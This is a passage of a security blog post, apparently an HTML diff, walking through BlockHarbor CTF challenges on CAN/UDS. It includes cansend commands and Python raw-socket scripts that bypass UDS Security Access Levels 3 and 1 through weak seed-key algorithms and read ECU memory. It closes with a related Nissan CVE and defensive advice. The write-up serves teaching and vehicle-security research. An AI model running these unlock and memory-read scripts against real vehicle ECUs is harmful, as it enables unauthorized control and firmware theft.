+    &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt;:
+        byte_data = bytes.fromhex(hex_data_string)
+        ascii_string = byte_data.decode(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ascii&amp;quot;&lt;/span&gt;, errors=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ignore&amp;quot;&lt;/span&gt;)
+        print(ascii_string)
+        
+    &lt;span class=&#34;hljs-keyword&#34;&gt;except&lt;/span&gt; ValueError:
+        print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;error&amp;quot;&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Through the code above, data in the &lt;code&gt;0xC3F83000&lt;/code&gt; range can be parsed.&lt;/p&gt;
+&lt;p&gt;Although the Python &lt;code&gt;can&lt;/code&gt; module is typically used for CAN communication, it is unavailable in a simulation environment&amp;#x2026; Therefore, it was written using the &lt;code&gt;socket&lt;/code&gt; module as a replacement.&lt;/p&gt;
+&lt;p&gt;When representing the CAN format with the Python &lt;code&gt;socket&lt;/code&gt; module, the argument &lt;code&gt;=IB3x8s&lt;/code&gt; must be provided.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image20.png&#34; alt=&#34;image20.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The flag present in memory can be confirmed by executing the code.&lt;/p&gt;
+&lt;h3 id=&#34;3-5-Security-Access-Level-3&#34;&gt;&lt;a href=&#34;#3-5-Security-Access-Level-3&#34; class=&#34;headerlink&#34; title=&#34;3.5. Security Access Level 3&#34;&gt;&lt;/a&gt;3.5. Security Access Level 3&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;image21.png&#34; alt=&#34;image21.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This challenge requires identifying the cryptographic algorithm for Security Access Level 3 and finding the corresponding key for the seed value 0x1337. As described in the problem, the length of both the seed and the key for Level 3 is 2 bytes.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image22.png&#34; alt=&#34;[image22.png](https://blog.naver.com/suresofttech/223327497814)&#34;&gt;&lt;/p&gt;
+&lt;p&gt;First, let&amp;#x2019;s look at the Security Access function provided by UDS.&lt;/p&gt;
+&lt;p&gt;Security Access is a service that controls access rights to the ECU. It&amp;#x2019;s helpful to think of higher numbers representing higher levels of authority. It is used with SID &lt;code&gt;27&lt;/code&gt; after first changing to the Extended Diagnostic Session (&lt;code&gt;10&lt;/code&gt; - &lt;code&gt;03&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;A seed value is generated, and a key is created through an internal cryptographic algorithm. Communication is performed in a way that grants access if authentication with the corresponding key value is successful. A key point here is that only when sending the key value, the request must be made using the access level value being accessed plus 1.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image23.png&#34; alt=&#34;image23.png&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# listen 7E0, 7E8, 7DF&lt;/span&gt;
+candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# 02(PCI:len) 10(SID:DiagnosticSessionControl) 03(SubFunc:ExtendedSession)&lt;/span&gt;
+cansend vcan0 7E0&lt;span class=&#34;hljs-comment&#34;&gt;#021003&lt;/span&gt;
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# 02(PCI:len) 27(SID:SecurityAccess) 03(Level)&lt;/span&gt;
+cansend vcan0 7E0&lt;span class=&#34;hljs-comment&#34;&gt;#022703&lt;/span&gt;
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# 04(PCI:len) 27(SID:SecurityAccess) 04(Level+1) KEYS&lt;/span&gt;
+cansend vcan0 7E0&lt;span class=&#34;hljs-comment&#34;&gt;#042704KEYS&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Authentication for Level 3 can be performed according to the Security Access authentication sequence.&lt;/p&gt;
+&lt;p&gt;First, after changing to the Extended Diagnostic Session (&lt;code&gt;1030&lt;/code&gt;), the seed value &lt;code&gt;7E53&lt;/code&gt; generated by the Security Access Level 3 request (&lt;code&gt;2703&lt;/code&gt;) can be confirmed. Upon transmitting the corresponding key value, Security Access was successful, as confirmed by the Security Access RSID (&lt;code&gt;67&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;The cryptographic algorithm used was a simple one that performs a bitwise inversion of the seed value. Therefore, the flag can be obtained as the result of &lt;code&gt;0x1337 ^ 0xFFFF&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt; &lt;span class=&#34;hljs-comment&#34;&gt;# security access level 3 pass&lt;/span&gt;
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; socket
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; struct
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;build_can_frame&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;can_id, data&lt;/span&gt;):&lt;/span&gt;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; struct.pack(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;=IB3x8s&amp;quot;&lt;/span&gt;, can_id, len(data), data.ljust(&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x00&amp;quot;&lt;/span&gt;))
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;dissect_can_frame&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;frame&lt;/span&gt;):&lt;/span&gt;
+    can_id, dlc, data = struct.unpack(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;=IB3x8s&amp;quot;&lt;/span&gt;, frame)
+    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; can_id, data
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;with&lt;/span&gt; socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; p:
+    p.bind((&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;vcan0&amp;quot;&lt;/span&gt;,))
+    data1 = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x02\x10\x03\x00\x00\x00\x00\x00&amp;quot;&lt;/span&gt;
+    frame1 = build_can_frame(&lt;span class=&#34;hljs-number&#34;&gt;0x7E0&lt;/span&gt;, data1)
+    p.send(frame1)
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;True&lt;/span&gt;:
+        frame_r = p.recv(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)
+        can_id, msg_data = dissect_can_frame(frame_r)
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; can_id != &lt;span class=&#34;hljs-number&#34;&gt;0x7E0&lt;/span&gt;:
+            &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;
+
+    data2 = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x02\x27\x03\x00\x00\x00\x00\x00&amp;quot;&lt;/span&gt;
+    frame2 = build_can_frame(&lt;span class=&#34;hljs-number&#34;&gt;0x7E0&lt;/span&gt;, data2)
+    p.send(frame2)
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;True&lt;/span&gt;:
+        frame_r = p.recv(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)
+        can_id, msg_data = dissect_can_frame(frame_r)
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; can_id != &lt;span class=&#34;hljs-number&#34;&gt;0x7E0&lt;/span&gt;:
+            &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;
+    seed = msg_data.hex()[&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;]
+    print(&lt;span class=&#34;hljs-string&#34;&gt;f&amp;quot;Seed: &lt;span class=&#34;hljs-subst&#34;&gt;{seed}&lt;/span&gt;&amp;quot;&lt;/span&gt;)
+    
+    key = &lt;span class=&#34;hljs-string&#34;&gt;f&amp;quot;&lt;span class=&#34;hljs-subst&#34;&gt;{~int(seed, &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xFFFF&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;04&lt;/span&gt;X}&lt;/span&gt;&amp;quot;&lt;/span&gt;
+    print(&lt;span class=&#34;hljs-string&#34;&gt;f&amp;quot;Keys: &lt;span class=&#34;hljs-subst&#34;&gt;{key}&lt;/span&gt;&amp;quot;&lt;/span&gt;)
+    
+    key_bytes = int(key, &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;).to_bytes(&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;big&amp;apos;&lt;/span&gt;)
+    data3 = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x04\x27\x04&amp;quot;&lt;/span&gt; + key_bytes + &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x00\x00\x00&amp;quot;&lt;/span&gt;
+    frame3 = build_can_frame(&lt;span class=&#34;hljs-number&#34;&gt;0x7E0&lt;/span&gt;, data3)
+    p.send(frame3)
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;True&lt;/span&gt;:
+        frame_r = p.recv(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)
+        can_id, msg_data = dissect_can_frame(frame_r)
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; can_id != &lt;span class=&#34;hljs-number&#34;&gt;0x7E0&lt;/span&gt;:
+            &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;
+    
+    print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Security access level 3 unlock!&amp;quot;&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;image24.png&#34; alt=&#34;image24.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Additionally, the calculated key value must be transmitted within a very short time after confirming the seed value. Therefore, it is recommended to write code like the one above (though you can do it manually if you are fast enough).&lt;/p&gt;
+&lt;h3 id=&#34;3-6-Security-Access-Level-1&#34;&gt;&lt;a href=&#34;#3-6-Security-Access-Level-1&#34; class=&#34;headerlink&#34; title=&#34;3.6. Security Access Level 1&#34;&gt;&lt;/a&gt;3.6. Security Access Level 1&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;image25.png&#34; alt=&#34;image25.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This challenge requires identifying the Security Access Level 1 cryptographic algorithm by reading the memory in the &lt;code&gt;0x1A000&lt;/code&gt; range. The flag is the key value for the seed &lt;code&gt;0x7D0E1A5C&lt;/code&gt;. It is known that the seed and key lengths for Level 1 are 4 bytes.&lt;/p&gt;
+&lt;p&gt;Oddly, in this UDS Challenge, Level 1 is placed after Level 3.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# read memory&lt;/span&gt;
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; socket
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; struct
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;build_can_frame&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;can_id, data&lt;/span&gt;):&lt;/span&gt;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; struct.pack(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;=IB3x8s&amp;quot;&lt;/span&gt;, can_id, len(data), data.ljust(&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x00&amp;quot;&lt;/span&gt;))
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;dissect_can_frame&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;frame&lt;/span&gt;):&lt;/span&gt;
+    can_id, dlc, data = struct.unpack(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;=IB3x8s&amp;quot;&lt;/span&gt;, frame)
+    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; can_id, dlc, data
+
+recvdata = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;with&lt;/span&gt; socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; p:
+    can_id_filter = &lt;span class=&#34;hljs-number&#34;&gt;0x7E8&lt;/span&gt;
+    can_mask_filter = &lt;span class=&#34;hljs-number&#34;&gt;0xFFF&lt;/span&gt;
+    can_filter = struct.pack(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;=II&amp;quot;&lt;/span&gt;, can_id_filter, can_mask_filter)
+    p.setsockopt(socket.SOL_CAN_RAW, socket.CAN_RAW_FILTER, can_filter)
+    p.setsockopt(socket.SOL_CAN_RAW, socket.CAN_RAW_RECV_OWN_MSGS, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)
+
+    p.bind((&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;vcan0&amp;quot;&lt;/span&gt;,))
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; hex_value &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; range(&lt;span class=&#34;hljs-number&#34;&gt;0x1A000&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x1B000&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xFF&lt;/span&gt;):
+        candata = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x07\x23\x14&amp;quot;&lt;/span&gt; + hex_value.to_bytes(&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;big&amp;quot;&lt;/span&gt;) + &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\xff&amp;quot;&lt;/span&gt;
+        
+        data1 = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x02\x10\x02\x00\x00\x00\x00\x00&amp;quot;&lt;/span&gt;
+        frame1 = build_can_frame(&lt;span class=&#34;hljs-number&#34;&gt;0x7DF&lt;/span&gt;, data1)
+        p.send(frame1)
+        
+        frame_r1 = p.recv(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)
+        
+        frame2 = build_can_frame(&lt;span class=&#34;hljs-number&#34;&gt;0x7DF&lt;/span&gt;, candata)
+        p.send(frame2)
+        
+        frame_r2 = p.recv(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)
+        can_id2, dlc2, data_r2 = dissect_can_frame(frame_r2)
+        
+        recvdata += data_r2.hex()[&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;:]
+        
+        data3 = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x30\x00\x00\x00\x00\x00\x00\x00&amp;quot;&lt;/span&gt;
+        frame3 = build_can_frame(&lt;span class=&#34;hljs-number&#34;&gt;0x7E0&lt;/span&gt;, data3)
+        p.send(frame3)
+        
+        temp = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
+        &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; temp &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;36&lt;/span&gt;:
+            frame_r_loop = p.recv(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)
+            can_id_loop, dlc_loop, data_loop = dissect_can_frame(frame_r_loop)
+            
+            tempdata = data_loop.hex()[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;:]
+            
+            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; tempdata != &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;00000000000000&amp;quot;&lt;/span&gt;:
+                recvdata += tempdata
+            temp = temp + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;
+
+print(&lt;span class=&#34;hljs-string&#34;&gt;f&amp;quot;recv data: &lt;span class=&#34;hljs-subst&#34;&gt;{recvdata}&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;First, write the code to perform a read operation on the memory in the &lt;code&gt;0x1A000&lt;/code&gt; region.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image26.png&#34; alt=&#34;image26.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Previously, execute the code that authenticates Level 3 first to pass the Level 3 authentication.&lt;/p&gt;
+&lt;p&gt;After that, if you execute the memory read code you just wrote, you can confirm that a 4-byte value exists twice. You can confirm that this value changes every time a seed value is generated through a security access Level 1 request.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;hex(&lt;span class=&#34;hljs-number&#34;&gt;0x983cb51b&lt;/span&gt; ^ &lt;span class=&#34;hljs-number&#34;&gt;0xcd051f0c&lt;/span&gt;)
+&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;0x5539aa17&amp;apos;&lt;/span&gt;
+&lt;span class=&#34;hljs-meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;hex(&lt;span class=&#34;hljs-number&#34;&gt;0xddee9870&lt;/span&gt; ^ &lt;span class=&#34;hljs-number&#34;&gt;0x88d73267&lt;/span&gt;)
+&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;0x5539aa17&amp;apos;&lt;/span&gt;
+&lt;span class=&#34;hljs-meta&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;hex(&lt;span class=&#34;hljs-number&#34;&gt;0x4a4499ad&lt;/span&gt; ^ &lt;span class=&#34;hljs-number&#34;&gt;0x1f7d33ba&lt;/span&gt;)
+&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;0x5539aa17&amp;apos;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;It can be seen that performing an XOR operation on those values results in a fixed value of &lt;code&gt;0x5539aa17&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Through this, we can know that a key value calculated with the seed value exists in memory. And we can also know that the calculation algorithm is &lt;code&gt;seed ^ 0x5539aa17&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image28.png&#34; alt=&#34;image27.png&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# listen 7E0, 7E8, 7DF&lt;/span&gt;
+candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# 02(PCI:len) 10(SID:DiagnosticSessionControl) 03(SubFunc:ExtendedSession)&lt;/span&gt;
+cansend vcan0 7E0&lt;span class=&#34;hljs-comment&#34;&gt;#021003&lt;/span&gt;
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# 02(PCI:len) 27(SID:SecurityAccess) 01(Level)&lt;/span&gt;
+cansend vcan0 7E0&lt;span class=&#34;hljs-comment&#34;&gt;#022701&lt;/span&gt;
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# 06(PCI:len) 27(SID:SecurityAccess) 02(Level+1) KEYSKEYS&lt;/span&gt;
+cansend vcan0 7E0&lt;span class=&#34;hljs-comment&#34;&gt;#062702KEYSKEYS&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;When attempting Security Access Level 1 authentication using the discovered encryption algorithm, it can be seen that it succeeds, confirming the RSID (&lt;code&gt;67&lt;/code&gt;).&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# security access level 1 pass&lt;/span&gt;
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; socket
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; struct
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;build_can_frame&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;can_id, data&lt;/span&gt;):&lt;/span&gt;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; struct.pack(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;=IB3x8s&amp;quot;&lt;/span&gt;, can_id, len(data), data.ljust(&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x00&amp;quot;&lt;/span&gt;))
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;dissect_can_frame&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;frame&lt;/span&gt;):&lt;/span&gt;
+    can_id, dlc, data = struct.unpack(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;=IB3x8s&amp;quot;&lt;/span&gt;, frame)
+    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; can_id, data
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;with&lt;/span&gt; socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW) &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; p:
+    p.bind((&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;vcan0&amp;quot;&lt;/span&gt;,))
+    data1 = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x02\x10\x03\x00\x00\x00\x00\x00&amp;quot;&lt;/span&gt;
+    frame1 = build_can_frame(&lt;span class=&#34;hljs-number&#34;&gt;0x7E0&lt;/span&gt;, data1)
+    p.send(frame1)
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;True&lt;/span&gt;:
+        frame_r = p.recv(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)
+        can_id, msg_data = dissect_can_frame(frame_r)
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; can_id != &lt;span class=&#34;hljs-number&#34;&gt;0x7E8&lt;/span&gt;:
+            &lt;span class=&#34;hljs-keyword&#34;&gt;continue&lt;/span&gt;
+        &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;
+
+    data2 = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x02\x27\x01\x00\x00\x00\x00\x00&amp;quot;&lt;/span&gt;
+    frame2 = build_can_frame(&lt;span class=&#34;hljs-number&#34;&gt;0x7E0&lt;/span&gt;, data2)
+    p.send(frame2)
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;True&lt;/span&gt;:
+        frame_r = p.recv(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)
+        can_id, msg_data = dissect_can_frame(frame_r)
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; can_id != &lt;span class=&#34;hljs-number&#34;&gt;0x7E8&lt;/span&gt;:
+            &lt;span class=&#34;hljs-keyword&#34;&gt;continue&lt;/span&gt;
+        &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;
+
+    seed_bytes = msg_data[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;]
+    seed_int = int.from_bytes(seed_bytes, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;big&amp;apos;&lt;/span&gt;)
+    print(&lt;span class=&#34;hljs-string&#34;&gt;f&amp;quot;Seed: &lt;span class=&#34;hljs-subst&#34;&gt;{seed_int:&lt;span class=&#34;hljs-number&#34;&gt;08&lt;/span&gt;X}&lt;/span&gt;&amp;quot;&lt;/span&gt;)
+
+    key_int = seed_int ^ &lt;span class=&#34;hljs-number&#34;&gt;0x5539AA17&lt;/span&gt;
+    print(&lt;span class=&#34;hljs-string&#34;&gt;f&amp;quot;Key: &lt;span class=&#34;hljs-subst&#34;&gt;{key_int:&lt;span class=&#34;hljs-number&#34;&gt;08&lt;/span&gt;X}&lt;/span&gt;&amp;quot;&lt;/span&gt;)
+
+    key_bytes = key_int.to_bytes(&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;big&amp;apos;&lt;/span&gt;)
+    data3 = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x06\x27\x02&amp;quot;&lt;/span&gt; + key_bytes
+    frame3 = build_can_frame(&lt;span class=&#34;hljs-number&#34;&gt;0x7E0&lt;/span&gt;, data3)
+    p.send(frame3)
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;True&lt;/span&gt;:
+        frame_r = p.recv(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)
+        can_id, msg_data = dissect_can_frame(frame_r)
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; can_id != &lt;span class=&#34;hljs-number&#34;&gt;0x7E8&lt;/span&gt;:
+            &lt;span class=&#34;hljs-keyword&#34;&gt;continue&lt;/span&gt;
+        &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;
+
+    print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Security access level 1 unlock!&amp;quot;&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;image28.png&#34; alt=&#34;image28.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The code to unlock Security Access Level 1 can also be written.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image29.jpg&#34; alt=&#34;image29.jpg&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;4-CVEs-occurring-due-to-UDS-commands&#34;&gt;&lt;a href=&#34;#4-CVEs-occurring-due-to-UDS-commands&#34; class=&#34;headerlink&#34; title=&#34;4. CVEs occurring due to UDS commands&#34;&gt;&lt;/a&gt;4. CVEs occurring due to UDS commands&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;image30.jpg&#34; alt=&#34;image30.jpg&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Security vulnerabilities can occur with UDS commands learned through the BlockHarbor CTF, and there are actual cases where CVEs are issued. A prime example is &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2024-6347&#34;&gt;CVE-2024-6347&lt;/a&gt;, which occurred in the Nissan Altima.&lt;/p&gt;
+&lt;p&gt;CVE-2024-6347 is a case where a DoS vulnerability occurred via UDS commands. The DoS vulnerability was caused by unauthorized access to the ECU programming session in the blind spot detection sensor ECU firmware.&lt;/p&gt;
+&lt;p&gt;Furthermore, vulnerabilities through CAN/UDS can include Information Leakage through Read Data By Identifier Request (&lt;code&gt;22&lt;/code&gt;) and various Diagnostic Requests (&lt;code&gt;19&lt;/code&gt;, etc.), and the acquisition of ECU and in-vehicle privileges through Security Access (&lt;code&gt;27&lt;/code&gt;) bypass. In particular, if validation for Read Memory By Address Request (&lt;code&gt;23&lt;/code&gt;) is inadequate, the firmware can be leaked through internal memory access.&lt;/p&gt;
+&lt;p&gt;Therefore, rigorous validation of CAN/UDS messages and access control for security access can be said to be the most fundamental elements in vehicle security.&lt;/p&gt;
+&lt;p&gt;Next time, I will return with a different embedded topic! Thank you! &amp;#x1F44B;&amp;#x1F3FB;&lt;/p&gt;
+ - hack &amp; life">
+  <meta name="author" content="j0dev, y2sman">
+  <meta name="keywords" content>
+  <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
+  <meta name="naver-site-verification" content="0b4fea742ed293b82621684e466d9f26c3ccee06">
+
+
+  <meta property="og:type" content="website"> 
+  <meta property="og:title" content="[Research] Understanding CAN / UDS Vulnerabilities through BlockHarbor CTF and CVEs (EN) - hackyboiz">
